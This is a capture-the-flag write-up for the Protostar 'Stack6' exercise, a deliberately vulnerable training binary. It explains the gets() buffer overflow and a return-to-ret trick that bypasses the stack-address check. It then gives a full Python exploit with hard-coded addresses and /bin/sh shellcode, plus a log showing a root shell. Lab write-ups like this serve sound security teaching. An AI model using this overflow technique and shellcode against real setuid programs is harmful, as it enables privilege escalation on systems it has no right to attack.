Our goal is to solve this explotation challenge <i> [Stack6](https://exploit.education/protostar/stack-six/)</i>


# Code to exploit 
```

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}


```
## Problem of code
This is a standard buffer overflow challenge but with one difference from the previous one.
The code uses a compiler function called __builtin_return_address which gives us the current
return address of the function and then it checks if the return address starts with 0xbf which is 
the stack. 

So we can't redirect immediately to the stack.

What we will do is "return to the return command its self"

With this technique (return oriented programming) we will pass the check of return address and then the return command will pop
next word from stack and return there 



And then with this python code we will do the final explotation

```

import struct

#This function generates a string like AAAABBBBCCCC so that we can find some information 
#when we overflow gets function. Characters like AAAABBBBCCCC have easy to recognise hex values

def create_overflow_string(size):
        string = ""
        for i in range(size):
                if (i <26):
                        string = string + str(chr(65+i))*4
        return string

RANDOM_STRING_OVERFLOW = False
#RANDOM_STRING_OVERFLOW = True


#Find stack information
if (RANDOM_STRING_OVERFLOW == True ):
        string = create_overflow_string(26)
        print(string)

#Actual exploit
else:
        string = create_overflow_string(26)

        string =  string.split("UUUU")[0]

        #EIP points to next word
        EIP = struct.pack("I",0xbffff6e0+32)
        Return = struct.pack ("I",0x080484f9)


#       Copy shellcode from https://shell-storm.org/shellcode/files/shellcode-851.php

        shellcode ="\x90"*100+"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

        code = "\xCC"*100

        print (string+ Return +EIP+shellcode)


```


Finally we run like this, we use cat to keep stdin open for bin sh

```

user@protostar:~$ (python stack6.py ; cat ) | /opt/protostar/bin/stack6
input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP�RRRRSSSSTTTT��
ls -all
total 33
drwxr-xr-x 2 user user  160 Sep  2 06:05 .
drwxr-xr-x 6 root root   60 Oct 31  2012 ..
-rw------- 1 user user  172 Sep  2 06:05 .bash_history
-rw-r--r-- 1 user user  220 Apr 10  2010 .bash_logout
-rw-r--r-- 1 user user 3184 Apr 10  2010 .bashrc
-rw-r--r-- 1 user user  675 Apr 10  2010 .profile
-rwxr-xr-x 1 user user 4580 Sep  2 04:58 a.out
-rw-r--r-- 1 user user  323 Sep  2 05:21 format4.py
-rw-r--r-- 1 user user  122 Sep  2 04:58 main.c
-rw-r--r-- 1 user user 1142 Sep  2 06:07 stack6.py
-rw-r--r-- 1 user user   38 Sep  2 05:21 tmp
whoami 
root



```

and we get the expected output
